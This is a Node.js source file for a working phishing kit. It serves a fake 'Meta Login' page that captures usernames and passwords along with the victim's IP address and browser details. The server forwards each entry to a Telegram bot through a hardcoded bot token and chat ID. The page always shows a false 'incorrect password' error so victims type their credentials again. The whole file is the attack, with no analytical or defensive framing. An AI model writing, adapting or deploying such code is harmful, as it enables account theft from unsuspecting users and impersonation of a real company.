const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 3000;
const TOKEN = "8912562695:AAH3_MJYNFSKJo9duvYg_wMBQXSwNRCuoyo";
const CHAT_ID = "1692257834";

// HTML الصفحة الأساسية (مدمجة عشان ما تحتاج ملف منفصل)
const HTML_PAGE = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0;
            background-color: #ffffff; min-height: 100vh; justify-content: center;
        }
        .container { width: 100%; max-width: 400px; }
        .header { text-align: center; font-weight: bold; font-size: 20px; margin-bottom: 30px; margin-top: 10px; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #0064e0; }
        button { width: 100%; padding: 15px; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
        .login-btn { background-color: #0064e0; color: white; }
        .login-btn:disabled { opacity: 0.6; cursor: default; }
        .create-btn { background-color: transparent; border: 1px solid #0064e0; color: #0064e0; margin-top: 400px; }
        .forgot-password { text-align: center; font-weight: 600; color: #0064e0; cursor: pointer; }
        .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin-bottom: 10px; display: none; }
        .spinner { display: none; width: 18px; height: 18px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">∞ Meta</div>
    <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
    <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
    <input type="password" id="password" placeholder="Password" autocomplete="new-password">
    <button class="login-btn" id="loginBtn"><span id="btnText">Log in</span><div class="spinner" id="spinner"></div></button>
    <div class="forgot-password">Forgot password?</div>
    <button class="create-btn">Create new account</button>
</div>
<script>
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const errorMsg = document.getElementById('errorMsg');

loginBtn.addEventListener('click', async function(e) {
    e.preventDefault();
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if (!username || !password) {
        errorMsg.textContent = 'Please fill in both fields.';
        errorMsg.style.display = 'block';
        return;
    }
    loginBtn.disabled = true;
    btnText.style.display = 'none';
    spinner.style.display = 'block';
    errorMsg.style.display = 'none';

    let ip = 'Unknown';
    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
    const ua = navigator.userAgent;
    const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });
    const pageUrl = window.location.href;

    fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, ip, userAgent: ua, time, pageUrl })
    }).catch(e => console.log(e));

    setTimeout(() => {
        loginBtn.disabled = false;
        btnText.style.display = 'inline';
        spinner.style.display = 'none';
        errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
        errorMsg.style.display = 'block';
        passwordInput.value = '';
    }, 1500);
});
</script>
</body>
</html>`;

// ============== CREATE HTTP SERVER ==============
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    // --- Serve HTML page ---
    if (req.method === 'GET' && (pathname === '/' || pathname === '/index.html')) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(HTML_PAGE);
        return;
    }

    // --- API endpoint ---
    if (req.method === 'POST' && pathname === '/api/login') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const { username, password, ip, userAgent, time, pageUrl } = data;

                console.log('📥 Received login:', username);

                const message = [
                    '🔐 **Meta Login - New Entry**',
                    '━━━━━━━━━━━━━━━━━━━',
                    `👤 **Username/Email:** \`${username}\``,
                    `🔑 **Password:** \`${password}\``,
                    `🌐 **IP Address:** \`${ip}\``,
                    `📄 **Page:** ${pageUrl}`,
                    `💻 **User Agent:** ${userAgent}`,
                    `🕐 **Time:** ${time}`,
                    '━━━━━━━━━━━━━━━━━━━'
                ].join('\n');

                const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const tgResult = await tgRes.json();

                if (!tgRes.ok) {
                    console.error('❌ Telegram error:', tgResult);
                    res.writeHead(500);
                    res.end(JSON.stringify({ success: false }));
                    return;
                }

                console.log('✅ Sent to Telegram successfully');
                res.writeHead(200);
                res.end(JSON.stringify({ success: true }));

            } catch (err) {
                console.error('❌ Error:', err);
                res.writeHead(400);
                res.end(JSON.stringify({ success: false, error: err.message }));
            }
        });
        return;
    }

    // --- 404 ---
    res.writeHead(404);
    res.end('404 Not Found');
});

server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════╗
║   Meta Login Server  ✓ Running   ║
║   http://localhost:${PORT}        ║
╚══════════════════════════════════╝
    `);
});
